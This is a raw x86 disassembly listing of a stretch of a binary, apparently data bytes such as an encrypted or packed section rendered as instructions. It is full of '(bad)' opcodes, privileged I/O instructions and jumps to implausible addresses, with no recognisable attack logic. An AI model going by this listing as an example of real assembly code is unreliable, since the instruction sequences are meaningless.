  40ebcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebcc:	cmp    dl,ch
  40ebce:	push   ebx
  40ebcf:	cld    
  40ebd0:	retf   0xd564
  40ebd3:	dec    ebx
  40ebd4:	pop    ebp
  40ebd5:	icebp  
  40ebd6:	ins    DWORD PTR es:[edi],dx
  40ebd7:	fs mov edx,0xd71568ea
  40ebdd:	push   cs
  40ebde:	push   ecx
  40ebdf:	call   0x8aab2f7a
  40ebe4:	push   esp
  40ebe5:	retf   
  40ebe6:	lock add dh,ch
  40ebe9:	adc    BYTE PTR [esi+0x0],0x27
  40ebed:	(bad)  
  40ebee:	dec    esp
  40ebef:	cld    
  40ebf0:	bound  esp,QWORD PTR [edx-0x6f648a87]
  40ebf6:	xchg   edi,eax
  40ebf7:	adc    DWORD PTR [ecx+0xb],0xce78340b
  40ebfe:	push   ebx
  40ebff:	cli    
  40ec00:	jmp    FWORD PTR [ecx-0x60]
  40ec03:	cmp    esp,DWORD PTR [ebp+0x32]
  40ec06:	popf   
  40ec07:	add    edx,DWORD PTR [edi-0x7f]
  40ec0a:	ficomp WORD PTR [ebp+eiz*8+0x1fbfdb74]
  40ec11:	addr16 callw 0xf7d0
  40ec16:	push   0xffffffc1
  40ec18:	inc    edi
  40ec19:	popf   
  40ec1a:	xlat   BYTE PTR ds:[ebx]
  40ec1b:	pop    edx
  40ec1c:	push   eax
  40ec1d:	into   
  40ec1e:	retf   0x4662
  40ec21:	adc    DWORD PTR [eax+0x54],0xffffff82
  40ec25:	cmp    esp,ebx
  40ec27:	adc    DWORD PTR [esi],ebp
  40ec29:	pusha  
  40ec2a:	les    eax,FWORD PTR [ebp+0x7c66ee6c]
  40ec30:	pop    edx
  40ec31:	push   cs
  40ec32:	pushf  
  40ec33:	(bad)  
  40ec34:	stc    
  40ec35:	pop    eax
  40ec36:	cmp    esp,DWORD PTR [eax+0x6000670d]
  40ec3c:	add    al,0xc4
  40ec3e:	or     esp,eax
  40ec40:	out    0x16,al
  40ec42:	mov    al,ds:0x789ae3e0
  40ec47:	mov    eax,0x79b5b986
  40ec4c:	mov    ds:0x739391c9,eax
  40ec51:	mov    edx,0x95dd35d3
  40ec56:	out    0x71,eax
  40ec58:	(bad)  
  40ec59:	fiadd  WORD PTR [edi]
  40ec5b:	mov    al,BYTE PTR [edx+0x61d6df76]
  40ec61:	mov    esp,0x2f6f1b1e
  40ec66:	pushf  
  40ec67:	or     BYTE PTR [edx-0x25],bl
  40ec6a:	sbb    BYTE PTR [esi+0x7d],dl
  40ec6d:	sub    bl,BYTE PTR [eiz*8+0x1aaf6d2e]
  40ec74:	pop    es
  40ec75:	push   edi
  40ec76:	push   edi
  40ec77:	dec    esi
  40ec78:	inc    ebx
  40ec79:	in     eax,0xcf
  40ec7b:	cmp    al,0xf0
  40ec7d:	repnz hlt 
  40ec7f:	cmp    esp,DWORD PTR [ebx+0x3c]
  40ec82:	les    esp,FWORD PTR [ecx-0x2991058f]
  40ec88:	fwait
  40ec89:	ja     0x40eca3
  40ec8b:	adc    eax,ebx
  40ec8d:	cwde   
  40ec8e:	stos   DWORD PTR es:[edi],eax
  40ec8f:	mov    DWORD PTR [edi],esi
  40ec91:	loope  0x40ecf1
  40ec93:	push   esp
  40ec94:	fadd   st,st(6)
  40ec96:	push   0xf5b58bcf
  40ec9b:	inc    eax
  40ec9c:	mov    ah,0x49
  40ec9e:	lods   eax,DWORD PTR ds:[esi]
  40ec9f:	(bad)  
  40eca1:	xchg   esp,eax
  40eca2:	retf   0x4762
  40eca5:	xor    esi,esp
  40eca7:	mov    cs:0xe3270eda,eax
  40ecad:	pop    esp
  40ecae:	push   0xd4c5947
  40ecb3:	sbb    BYTE PTR [ecx+edx*1-0x7a2501ce],al
  40ecba:	das    
  40ecbb:	mov    ebx,0x725083f1
  40ecc0:	inc    eax
  40ecc1:	pop    esi
  40ecc2:	div    DWORD PTR [ebp-0x9]
  40ecc5:	ja     0x40ec84
  40ecc7:	xchg   esi,eax
  40ecc8:	outs   dx,DWORD PTR ds:[esi]
  40ecc9:	adc    eax,DWORD PTR [ebp+0x24]
  40eccc:	rol    bh,cl
  40ecce:	in     eax,0x2
  40ecd0:	xor    ecx,DWORD PTR [esi+0x2]
  40ecd3:	push   edx
  40ecd4:	mov    gs,WORD PTR [edi]
  40ecd6:	cmp    al,0xee
  40ecd8:	js     0x40ece7
  40ecda:	inc    edx
  40ecdb:	iret   
  40ecdc:	and    BYTE PTR [ebp+ebx*1-0x80],0xf2
  40ece1:	shl    DWORD PTR [esi-0x6f],0xcc
  40ece5:	pushf  
  40ece6:	sbb    al,0x37
  40ece8:	add    al,0xb6
  40ecea:	jge    0x40ec77
  40ecec:	imul   esi,DWORD PTR [ebx],0xffffffa7
  40ecef:	into   
  40ecf0:	mov    DWORD PTR [edx],ebx
  40ecf2:	ds mov cx,0x4409
  40ecf7:	retf   
  40ecf8:	pop    edx
  40ecf9:	cmp    eax,0x57819cdd
  40ecfe:	lods   al,BYTE PTR ds:[esi]
  40ecff:	aas    
  40ed00:	fwait
  40ed01:	repnz add ah,bh
  40ed04:	stos   DWORD PTR es:[edi],eax
  40ed05:	call   0x59c0:0xd378b614
  40ed0c:	maskmovq mm4,(bad)
  40ed0d:	mul    DWORD PTR [edx]
  40ed0f:	jle    0x40ec99
  40ed11:	inc    esi
  40ed12:	sbb    DWORD PTR [edi-0x2],ebp
  40ed15:	ret    
  40ed16:	scas   al,BYTE PTR es:[edi]
  40ed17:	addr16 ret 
  40ed19:	test   BYTE PTR [edi],bl
  40ed1b:	test   al,0x93
  40ed1d:	mov    al,0x6
  40ed1f:	cmp    BYTE PTR [ebp-0x20e0845],ch
  40ed25:	mov    DWORD PTR [eax-0x3],esi
  40ed28:	add    eax,0x11125d51
  40ed2d:	stos   DWORD PTR es:[edi],eax
  40ed2e:	int3   
  40ed2f:	push   ds
  40ed30:	in     eax,0x8f
  40ed32:	lds    ecx,FWORD PTR [ecx-0x535f289a]
  40ed38:	cdq    
  40ed39:	sub    dl,BYTE PTR [ebx+0x29]
  40ed3c:	outs   dx,BYTE PTR ds:[esi]
  40ed3d:	popa   
  40ed3e:	and    DWORD PTR [eax+0x41],eax
  40ed41:	xchg   edi,eax
  40ed42:	adc    BYTE PTR [ebx],al
  40ed44:	cmp    al,0x7c
  40ed46:	jle    0x40ecfa
  40ed48:	fiadd  WORD PTR [eax+0x1a]
  40ed4b:	out    dx,al
  40ed4c:	fwait
  40ed4d:	js     0x40ecd1
  40ed4f:	push   edi
  40ed50:	sbb    BYTE PTR [esi+0x1c],ch
  40ed53:	cmp    esi,DWORD PTR [esi]
  40ed55:	or     BYTE PTR [esi+0x3],cl
  40ed58:	mov    ebx,ebx
  40ed5a:	xchg   ebx,eax
  40ed5b:	in     al,0x8f
  40ed5d:	test   ebx,ebp
  40ed5f:	push   eax
  40ed60:	fnstenv [edi]
  40ed62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed63:	push   ebx
  40ed64:	push   cs
  40ed65:	lods   al,BYTE PTR ds:[esi]
  40ed66:	fcmovu st,st(7)
  40ed68:	mov    ds:0xad165537,al
  40ed6d:	neg    BYTE PTR [ebx-0x23b6e589]
  40ed73:	clc    
  40ed74:	test   al,0xfc
  40ed76:	ins    DWORD PTR es:[edi],dx
  40ed77:	pop    edx
  40ed78:	fldcw  WORD PTR [ebp-0x44f6a498]
  40ed7e:	push   ecx
  40ed7f:	pop    edx
  40ed80:	imul   ebx,DWORD PTR [esi-0x48f1583],0xa
  40ed87:	and    DWORD PTR [edx-0x44],eax
  40ed8a:	xchg   ebp,eax
  40ed8b:	sbb    al,BYTE PTR ds:0xac016b8f
  40ed91:	dec    ecx
  40ed92:	xchg   ebp,eax
  40ed93:	ret    
  40ed94:	jmp    0x9fcad5f4
  40ed99:	pop    ebx
  40ed9a:	fnstenv [esi+0x5f305cff]
  40eda0:	or     eax,DWORD PTR [eax+0x55]
  40eda3:	jge    0x40ed67
  40eda5:	retf   0x3c52
  40eda8:	xchg   DWORD PTR [eax+0x24],ebp
  40edab:	dec    esi
  40edac:	popf   
  40edad:	mov    ds:0xe9b45e3d,al
  40edb2:	fwait
  40edb3:	cs iret 
  40edb5:	fbld   TBYTE PTR [edx]
  40edb7:	repnz add eax,0x341275d6
  40edbd:	fs (bad) 
  40edbf:	jne    0x40edc0
  40edc1:	push   edi
  40edc2:	xor    DWORD PTR [esi],ebp
  40edc4:	mov    al,ds:0x4358a473
  40edc9:	loop   0x40eddd
  40edcb:	mov    ch,BYTE PTR [ebx-0x61]
  40edce:	lahf   
  40edcf:	jns    0x40ed70
  40edd1:	aaa    
  40edd2:	stos   BYTE PTR es:[edi],al
  40edd3:	pcmpeqw mm2,mm1
  40edd6:	leave  
  40edd7:	jg     0x40ed9a
  40edd9:	imul   edi,DWORD PTR [edx],0x802dac5e
  40eddf:	or     cl,BYTE PTR [esi+ecx*1+0x2fa49617]
  40ede6:	inc    ebx
  40ede7:	push   cs
  40ede8:	out    0x77,al
  40edea:	cmpxchg BYTE PTR [ecx+0x57],ch
  40edee:	mov    ebx,0xfa730d16
  40edf3:	enter  0x4ae0,0x31
  40edf7:	out    dx,eax
  40edf8:	mov    bh,0x23
  40edfa:	push   edi
  40edfb:	addr16 jbe 0x40eda3
  40edfe:	and    BYTE PTR [eax-0x4b19bb79],dh
  40ee04:	sti    
  40ee05:	push   ds
  40ee06:	or     cl,bl
  40ee08:	sti    
  40ee09:	add    BYTE PTR [edx-0x66f6149],ah
  40ee0f:	xchg   dh,ch
  40ee11:	pop    ss
  40ee12:	lods   eax,DWORD PTR ds:[esi]
  40ee13:	call   0xa65639cc
  40ee18:	mov    esi,0x71bcdd17
  40ee1d:	je     0x40edde
  40ee1f:	xchg   edi,eax
  40ee20:	sub    al,0xd2
  40ee22:	and    esp,ecx
  40ee24:	jae    0x40ee27
  40ee26:	mov    edi,0xfd1e6396
  40ee2b:	ror    DWORD PTR [ebp+edi*4-0x1d6e88b4],cl
  40ee32:	enter  0xbda3,0xd5
  40ee36:	sub    DWORD PTR [ecx],ebp
  40ee38:	clc    
  40ee39:	xchg   BYTE PTR [edi-0x3],dh
  40ee3c:	(bad)  [ecx+0x7a8e8015]
  40ee42:	aam    0xf6
  40ee44:	sub    bh,ah
  40ee46:	test   DWORD PTR [ecx],eax
  40ee48:	xor    esi,DWORD PTR [edi-0x2bdfb686]
  40ee4e:	dec    edi
  40ee4f:	dec    esp
  40ee50:	in     eax,dx
  40ee51:	jae    0x40eeaf
  40ee53:	pop    esp
  40ee54:	js     0x40eec4
  40ee56:	retf   0x976e
  40ee59:	sti    
  40ee5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee5b:	iret   
  40ee5c:	ret    0xdbbe
  40ee5f:	mov    ch,0x98
  40ee61:	and    eax,0x14b7b0ed
  40ee66:	sub    DWORD PTR [ebx-0x12],eax
  40ee69:	mov    cs,WORD PTR [edi]
  40ee6b:	and    al,0x33
  40ee6d:	sbb    DWORD PTR [edi-0x5c5e6e3c],0xffffff8a
  40ee74:	not    DWORD PTR [esi]
  40ee76:	aam    0x1
  40ee78:	mov    ebp,0xe721ae33
  40ee7d:	push   cs
  40ee7e:	xor    al,0x9
  40ee80:	cdq    
  40ee81:	mov    WORD PTR [ecx-0x393d4985],cs
  40ee87:	push   esi
  40ee88:	adc    bh,bh
  40ee8a:	(bad)  
  40ee8b:	inc    edx
  40ee8c:	xchg   esi,eax
  40ee8d:	(bad)  
  40ee8e:	adc    cl,ah
  40ee90:	ret    
  40ee91:	loopne 0x40ee51
  40ee93:	mov    edx,DWORD PTR [esp+0x13e77045]
  40ee9a:	adc    eax,0xb09e1a38
  40ee9f:	frstor [esi+0x17]
  40eea2:	(bad)  
  40eea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eea4:	add    BYTE PTR [esi-0x4],cl
  40eea7:	and    DWORD PTR [edi+0x6],0x1e78981b
  40eeae:	retf   0x2da4
  40eeb1:	sub    DWORD PTR [ebx+0x5fe8cc4],ebx
  40eeb7:	jg     0x40eee3
  40eeb9:	sub    eax,0x42f1fa29
  40eebe:	jne    0x40ee69
  40eec0:	pop    es
  40eec1:	xchg   BYTE PTR [ebx+eiz*8+0x1001bf32],dh
  40eec8:	pop    ebp
  40eec9:	int3   
  40eeca:	mov    ah,0xc3
  40eecc:	add    eax,0x56bc547c
  40eed1:	mov    al,ds:0x367e0c1a
  40eed6:	and    eax,edx
  40eed8:	sbb    esi,DWORD PTR [eax]
  40eeda:	sub    eax,0x5a2221d6
  40eedf:	sbb    esi,edi
  40eee1:	in     al,0xc2
  40eee3:	adc    ecx,esi
  40eee5:	cmp    ch,BYTE PTR ds:0xa2aab6d6
  40eeeb:	pop    ebp
  40eeec:	outs   dx,BYTE PTR ds:[esi]
  40eeed:	ins    DWORD PTR es:[edi],dx
  40eeee:	inc    edx
  40eeef:	mov    WORD PTR [edx],ss
  40eef1:	adc    al,0x30
  40eef3:	ficom  DWORD PTR [edi+edi*1]
  40eef6:	inc    ebp
  40eef7:	push   ebp
  40eef8:	lds    edi,FWORD PTR ds:0x99fa356e
  40eefe:	aam    0x12
  40ef00:	(bad)
  40ef04:	push   edx
  40ef05:	mov    al,ds:0x9b12cac4
  40ef0a:	cmp    al,0xb
  40ef0c:	pop    ss
  40ef0d:	out    dx,al
  40ef0e:	sti    
  40ef0f:	or     eax,0xc3837069
  40ef14:	xchg   ecx,eax
  40ef15:	dec    edx
  40ef16:	repz test eax,0x4c2c5fdf
  40ef1c:	dec    eax
  40ef1d:	or     eax,DWORD PTR [ecx+ecx*1-0x5d]
  40ef21:	sub    al,0x57
  40ef23:	loopne 0x40eebb
  40ef25:	jp     0x40ef98
  40ef27:	add    ecx,DWORD PTR [ecx]
  40ef29:	add    al,0xb9
  40ef2b:	jmp    0xd30e5334
  40ef30:	stc    
  40ef31:	xchg   ebp,eax
  40ef32:	jg     0x40ef0e
  40ef34:	mov    ds:0x380d0bd5,eax
  40ef39:	jo     0x40eecb
  40ef3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef3c:	or     BYTE PTR [eax],dh
  40ef3e:	sbb    DWORD PTR [esi-0x13],0x91d23962
  40ef45:	not    dh
  40ef47:	jp     0x40ef4f
  40ef49:	addr16 in eax,0xfb
  40ef4c:	xchg   ecx,eax
  40ef4d:	arpl   WORD PTR [edx],dx
  40ef4f:	cmp    bl,BYTE PTR [ecx-0x6a]
  40ef52:	mov    ecx,0x4f4fbd1e
  40ef57:	idiv   DWORD PTR [ecx-0x7d9963dd]
  40ef5d:	xlat   BYTE PTR ds:[ebx]
  40ef5e:	add    DWORD PTR [esi-0x115c71a1],0x7c918cd5
  40ef68:	cmp    eax,0xa23dea1
  40ef6d:	jno    0x40ef9d
  40ef6f:	pusha  
  40ef70:	xchg   ecx,eax
  40ef71:	or     dl,BYTE PTR [ebx+0x53568bf5]
  40ef77:	ss xchg ecx,eax
  40ef79:	mov    BYTE PTR [esp+edx*2+0x1121b0ca],dl
  40ef80:	test   BYTE PTR [edx+0x534780fb],0x38
  40ef87:	in     eax,0x32
  40ef89:	xchg   ecx,eax
  40ef8a:	sub    eax,0xb03e8075
  40ef8f:	mov    ds:0x204367c7,al
  40ef94:	mov    dh,0x50
  40ef96:	and    edi,DWORD PTR [edx-0x6d]
  40ef99:	or     DWORD PTR [edx],esp
  40ef9b:	adc    DWORD PTR [edx+0x76ac138c],eax
  40efa1:	adc    BYTE PTR [ecx-0x74],dh
  40efa4:	dec    esi
  40efa5:	or     DWORD PTR [esi],ecx
  40efa7:	sub    eax,eax
  40efa9:	cld    
  40efaa:	test   eax,0x2a29002e
  40efaf:	mov    ebx,edi
  40efb1:	rcr    DWORD PTR [edx-0x227bcc03],cl
  40efb7:	adc    eax,0xf3aa94a3
  40efbc:	adc    dl,bh
  40efbe:	add    al,0xda
  40efc0:	bound  esp,QWORD PTR ds:0xa2535a83
  40efc6:	loopne 0x40ef7c
  40efc8:	mov    edi,DWORD PTR [ebp-0x3975ed87]
  40efce:	dec    eax
  40efcf:	pop    ss
  40efd0:	(bad)  
  40efd1:	fimul  DWORD PTR [edi]
  40efd3:	adc    ecx,DWORD PTR [ebp-0x2582302c]
  40efd9:	int3   
  40efda:	add    dh,bl
  40efdc:	mov    edi,0x7f2a2565
  40efe1:	test   DWORD PTR [ebx+eiz*1-0x3f7f6077],esi
  40efe8:	xchg   esi,eax
  40efe9:	cmp    DWORD PTR [edx+0x6971fff4],ecx
  40efef:	test   DWORD PTR [edi+0x5d9b2f81],esp
  40eff5:	frstor [esi-0x3d]
  40eff8:	cmp    BYTE PTR [ecx-0x3af4be6f],0xf
  40efff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f000:	push   0xffffffa0
  40f002:	sbb    ebx,DWORD PTR [edi]
  40f004:	loop   0x40efdb
  40f006:	call   0x4490:0x28a8ab8e
  40f00d:	dec    ebx
  40f00e:	mov    ebp,0x2bd34de8
  40f013:	push   ds
  40f014:	not    esp
  40f016:	xchg   ebx,eax
  40f017:	add    al,BYTE PTR [edx-0x13]
  40f01a:	cli    
  40f01b:	(bad)  
  40f01c:	fnsave [ecx+0x6a890f3f]
  40f022:	int    0xdc
  40f024:	adc    ch,al
  40f026:	xchg   esp,eax
  40f027:	dec    BYTE PTR [eax+eiz*2-0x700b1e36]
  40f02e:	mov    ss,ebx
  40f030:	es (bad) 
  40f032:	and    eax,eax
  40f034:	add    BYTE PTR [eax],0x8d
  40f037:	push   eax
  40f038:	push   0xfffffff6
  40f03a:	les    edx,FWORD PTR [edx+0x3b039c7b]
  40f040:	sbb    dl,BYTE PTR [ebx-0x7a677015]
  40f046:	leave  
  40f047:	cwde   
  40f048:	test   BYTE PTR ds:0x2370c161,dh
  40f04e:	and    eax,0x77aaa31f
  40f053:	outs   dx,BYTE PTR ds:[esi]
  40f054:	std    
  40f055:	pop    ss
  40f056:	(bad)  
  40f057:	cmp    ebx,esp
  40f059:	dec    esi
  40f05a:	dec    ebp
  40f05b:	sub    BYTE PTR [ebx],cl
  40f05d:	int    0x7a
  40f05f:	dec    ebx
  40f060:	sbb    eax,DWORD PTR [edi+0x163e49a]
  40f066:	push   ecx
  40f067:	inc    esp
  40f068:	mov    cs,WORD PTR [ecx-0x6dd68fec]
  40f06e:	test   BYTE PTR [ecx*8-0x2e55b1ca],cl
  40f075:	push   0xdf8ea2a1
  40f07a:	scas   al,BYTE PTR es:[edi]
  40f07b:	dec    ebx
  40f07c:	test   DWORD PTR [ebp-0x4792e1d1],ecx
  40f082:	gs dec ebx
  40f084:	mov    dl,0x8
  40f086:	fs pop esp
  40f088:	push   es
  40f089:	sub    al,BYTE PTR [edx-0x21351eb2]
  40f08f:	xor    DWORD PTR [eax+ecx*8],0xffffff9d
  40f093:	shl    BYTE PTR [ebx-0x18],cl
  40f096:	pop    esi
  40f097:	call   0x5924:0x5681bced
  40f09e:	mov    BYTE PTR [esi+0x5afc2368],0x1a
  40f0a5:	(bad)  
  40f0a6:	test   BYTE PTR ds:0x53f458e,0xf3
  40f0ad:	std    
  40f0ae:	stc    
  40f0af:	shr    DWORD PTR [ebp+0x6b],cl
  40f0b2:	test   BYTE PTR [eax-0x75302e32],bh
  40f0b8:	imul   eax,DWORD PTR [edi],0x13
  40f0bb:	(bad)  
  40f0bc:	outs   dx,DWORD PTR ds:[esi]
  40f0bd:	inc    esp
  40f0be:	imul   edi,DWORD PTR [edi-0x11962539],0x63961b47
  40f0c8:	mov    esi,0x89f586aa
  40f0cd:	(bad)
  40f0d0:	cwde   
  40f0d1:	push   cs
  40f0d2:	pop    ebp
  40f0d3:	addr16 mov ebp,0x566c9ffa
  40f0d9:	loopne 0x40f0b0
  40f0db:	xlat   BYTE PTR ds:[ebx]
  40f0dc:	mov    ch,dl
  40f0de:	jl     0x40f0cc
  40f0e0:	loopne 0x40f064
  40f0e2:	push   es
  40f0e3:	mov    esp,0xae7ecff5
  40f0e8:	loope  0x40f0e7
  40f0ea:	arpl   bp,si
  40f0ec:	adc    BYTE PTR [edx],al
  40f0ee:	add    cl,BYTE PTR [ecx]
  40f0f0:	loop   0x40f12c
  40f0f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0f3:	sub    al,0x70
  40f0f5:	inc    BYTE PTR [ecx+0x51]
  40f0f8:	stc    
  40f0f9:	fistp  DWORD PTR [ebp-0x31cd85d2]
  40f0ff:	int3   
  40f100:	dec    esp
  40f101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f102:	inc    esp
  40f103:	push   edi
  40f104:	test   ecx,esp
  40f106:	dec    ebp
  40f107:	push   es
  40f108:	(bad)  
  40f109:	les    esi,FWORD PTR [ebx]
  40f10b:	jcxz   0x40f17a
  40f10e:	dec    ebx
  40f10f:	cs (bad) 
  40f111:	xor    DWORD PTR [edi+0x37fb557c],ebx
  40f117:	inc    edx
  40f118:	push   0xffffff85
  40f11a:	pop    ebp
  40f11b:	xchg   esi,eax
  40f11c:	xor    DWORD PTR [esi],ebx
  40f11e:	push   ds
  40f11f:	cmp    eax,0xd65889bf
  40f124:	cmp    al,0x72
  40f126:	xor    BYTE PTR [ebp-0x54],al
  40f129:	daa    
  40f12a:	and    al,0x3a
  40f12c:	sbb    DWORD PTR [esi-0x3489c941],esi
  40f132:	aas    
  40f133:	and    edi,ecx
  40f135:	inc    DWORD PTR [edi]
  40f137:	push   edi
  40f138:	in     eax,0x9d
  40f13a:	jp     0x40f142
  40f13c:	or     DWORD PTR [edx-0x33e56eb],esp
  40f142:	sub    dl,BYTE PTR [ecx-0x44c29527]
  40f148:	dec    ebx
  40f149:	cdq    
  40f14a:	sbb    DWORD PTR [edi],0x2d
  40f14d:	jmp    0xd7f6137a
  40f152:	gs dec edi
  40f154:	pushf  
  40f155:	rsqrtps xmm7,XMMWORD PTR [ecx-0x3a5ce6b0]
  40f15c:	add    eax,0x43a372fe
  40f161:	ss es sub eax,0x997555ad
  40f168:	ret    0x30f4
  40f16b:	ret    
  40f16c:	inc    esp
  40f16d:	mov    cs,WORD PTR [ecx]
  40f16f:	adc    eax,0xb074add8
  40f174:	les    ecx,FWORD PTR [ecx+0x2c]
  40f177:	hlt    
  40f178:	daa    
  40f179:	stos   BYTE PTR es:[edi],al
  40f17a:	mov    ecx,0x70e1ae59
  40f17f:	push   eax
  40f180:	outs   dx,BYTE PTR ds:[esi]
  40f181:	inc    ebp
  40f182:	push   edi
  40f183:	pop    ebx
  40f184:	or     al,0xf4
  40f186:	int    0x1c
  40f188:	mov    bh,0xc7
  40f18a:	jno    0x40f149
  40f18c:	xchg   ebx,eax
  40f18d:	sbb    BYTE PTR [ebx-0x197da230],0xc6
  40f194:	mov    DWORD PTR [ebp-0x1b],eax
  40f197:	into   
  40f198:	retf   0x384c
  40f19b:	or     ecx,ecx
  40f19d:	add    al,0x8c
  40f19f:	pop    edx
  40f1a0:	lods   al,BYTE PTR ds:[esi]
  40f1a1:	cwde   
  40f1a2:	retf   
  40f1a3:	aas    
  40f1a4:	pop    esi
  40f1a5:	shl    BYTE PTR [ecx+ebx*2+0x71],0x29
  40f1aa:	pusha  
  40f1ab:	and    DWORD PTR [edx-0x5],ebp
  40f1ae:	adc    eax,DWORD PTR [edx+ebx*8]
  40f1b1:	adc    ebx,DWORD PTR [edx]
  40f1b3:	mov    ebx,0x3eafed7b
  40f1b8:	mov    ?,WORD PTR [esi-0x71]
  40f1bb:	aad    0xcd
  40f1bd:	xor    eax,0x4472395e
  40f1c2:	jmp    0x40f221
  40f1c4:	sub    DWORD PTR [eax+ecx*8-0x5c],esp
  40f1c8:	lock les edi,FWORD PTR [esp+esi*1+0x5f]
  40f1cd:	loop   0x40f177
  40f1cf:	adc    esi,DWORD PTR ds:0x133df2da
  40f1d5:	ret    
  40f1d6:	jo     0x40f1f9
  40f1d8:	jecxz  0x40f21c
  40f1da:	add    cl,BYTE PTR [edx]
  40f1dc:	and    BYTE PTR [edx+0x1f],0x9c
  40f1e0:	pushf  
  40f1e1:	adc    al,0xb5
  40f1e3:	ficom  WORD PTR [ecx+0x77]
  40f1e6:	push   0x47
  40f1e8:	lahf   
  40f1e9:	mov    ecx,?
  40f1eb:	dec    esp
  40f1ec:	imul   edi,DWORD PTR [edx+esi*1+0x4e76c9e8],0x5455b9b8
  40f1f7:	fwait
  40f1f8:	and    ebx,edx
  40f1fa:	lods   eax,DWORD PTR ds:[esi]
  40f1fb:	jle    0x40f239
  40f1fd:	cmp    edx,edi
  40f1ff:	dec    ecx
  40f200:	adc    esi,DWORD PTR ds:0xb25e1d8f
  40f206:	ins    BYTE PTR es:[di],dx
  40f208:	ror    DWORD PTR [ebx+0x76],cl
  40f20b:	jp     0x40f1b1
  40f20d:	xchg   esp,eax
  40f20e:	and    BYTE PTR ds:0x4e2b01d3,al
  40f215:	(bad)  
  40f216:	imul   ebx,DWORD PTR [esi-0x32],0x948e46a
  40f21d:	push   ecx
  40f21e:	xlat   BYTE PTR ds:[ebx]
  40f21f:	inc    ebp
  40f220:	jmp    0x40f1b8
  40f222:	fcom   DWORD PTR [ebx+0x21c2621b]
  40f228:	add    dl,cl
  40f22a:	mov    WORD PTR [edx-0x599ca570],gs
  40f230:	cmp    eax,0x67ea4ecd
  40f235:	xchg   edi,eax
  40f236:	push   es
  40f237:	hlt    
  40f238:	jmp    0x3348:0xc9b005dc
  40f23f:	mov    BYTE PTR [edi+esi*8-0x67046cf6],bh
  40f246:	add    BYTE PTR [eax+0x7c3c56d0],ch
  40f24c:	pop    ds
  40f24d:	mov    dh,0x62
  40f24f:	maxps  xmm3,XMMWORD PTR [edi+0x10]
  40f253:	fimul  DWORD PTR [esi+edi*1-0x6e]
  40f257:	jno    0x40f261
  40f259:	jge    0x40f287
  40f25b:	xor    edi,ebx
  40f25d:	cmp    al,0xc6
  40f25f:	arpl   WORD PTR [esi],bp
  40f261:	jmp    0xa7a2178a
  40f266:	aas    
  40f267:	fld    DWORD PTR [ecx-0x3732367f]
  40f26d:	test   bh,cl
  40f26f:	jo     0x40f1f9
  40f271:	ja     0x40f2e9
  40f273:	sub    BYTE PTR [ebx],ah
  40f275:	add    eax,0xcefff626
  40f27a:	adc    edx,esi
  40f27c:	ret    
  40f27d:	sti    
  40f27e:	fs iret 
  40f280:	iret   
  40f281:	xlat   BYTE PTR ds:[ebx]
  40f282:	jle    0x40f24b
  40f284:	add    BYTE PTR [esi+0x2dae66f3],ah
  40f28a:	rcl    DWORD PTR [eax],cl
  40f28c:	or     DWORD PTR [ebx-0x4605a591],ebx
  40f292:	cmp    al,0x22
  40f294:	cli    
  40f295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f296:	int3   
  40f297:	aaa    
  40f298:	sub    cl,al
  40f29a:	enter  0x2ed5,0x46
  40f29e:	shr    DWORD PTR [eax+0x7e38af77],0x8d
  40f2a5:	cli    
  40f2a6:	mov    eax,ds:0x80501b58
  40f2ab:	sbb    eax,0x94ef423f
  40f2b0:	dec    edi
  40f2b1:	cwde   
  40f2b2:	sub    BYTE PTR [ebx-0x7e],bh
  40f2b5:	sub    eax,0x241cda7
  40f2ba:	mov    ds:0x45650eba,eax
  40f2bf:	and    esi,DWORD PTR [eax+0x4c]
  40f2c2:	jle    0x40f273
  40f2c4:	jno    0x40f301
  40f2c6:	lock stos DWORD PTR es:[edi],eax
  40f2c8:	cdq    
  40f2c9:	or     al,0x8c
  40f2cb:	(bad)  
  40f2cc:	mov    al,ds:0xf5c059f1
  40f2d1:	test   eax,0x2bc257de
  40f2d6:	(bad)  
  40f2d7:	lods   al,BYTE PTR ds:[esi]
  40f2d8:	enter  0x413,0x82
  40f2dc:	rcl    BYTE PTR [ecx+0x7a],0x87
  40f2e0:	xor    DWORD PTR [eax-0x67],ebx
  40f2e3:	xlat   BYTE PTR ds:[ebx]
  40f2e4:	add    BYTE PTR [eax-0x253e3f6d],bl
  40f2ea:	out    0xb4,al
  40f2ec:	inc    edi
  40f2ed:	js     0x40f289
  40f2ef:	pop    ds
  40f2f0:	dec    ecx
  40f2f1:	rcl    DWORD PTR fs:[ecx*1-0x33ff8370],0xc5
  40f2fa:	nop
  40f2fb:	dec    edi
  40f2fc:	or     BYTE PTR [eax-0x571649d7],dh
  40f302:	scas   eax,DWORD PTR es:[edi]
  40f303:	cmp    esi,ebx
  40f305:	mov    ds:0x6b3c9181,eax
  40f30a:	out    dx,al
  40f30b:	cdq    
  40f30c:	push   ebx
  40f30d:	sti    
  40f30e:	outs   dx,BYTE PTR ds:[esi]
  40f30f:	dec    eax
  40f310:	mov    ecx,0x502ddca1
  40f315:	stos   DWORD PTR es:[edi],eax
  40f316:	xor    eax,0xcb8020ef
  40f31b:	mov    bl,0xcc
  40f31d:	inc    esi
  40f31e:	mov    BYTE PTR [edx-0x22],dh
  40f321:	sub    DWORD PTR [eax+0x57f855ac],edi
  40f327:	mov    ds:0xe0f5c275,eax
  40f32c:	aad    0x33
  40f32e:	add    al,0x38
  40f330:	sbb    al,0x11
  40f332:	bound  edx,QWORD PTR [edx+0x48344e22]
  40f338:	jb     0x40f328
  40f33a:	push   ecx
  40f33b:	gs pop ebx
  40f33d:	xor    ebp,ebp
  40f33f:	fbld   TBYTE PTR [eax-0x8e6f4c7]
  40f345:	js     0x40f2eb
  40f347:	push   esi
  40f348:	scas   eax,DWORD PTR es:[edi]
  40f349:	fs clc 
  40f34b:	mov    ebp,0x617905ea
  40f350:	div    BYTE PTR [edx+0x2acd17ec]
  40f356:	loop   0x40f3ab
  40f358:	ss mov edx,0xfd9fbe41
  40f35e:	and    BYTE PTR [esp+edi*4+0x20],0xbf
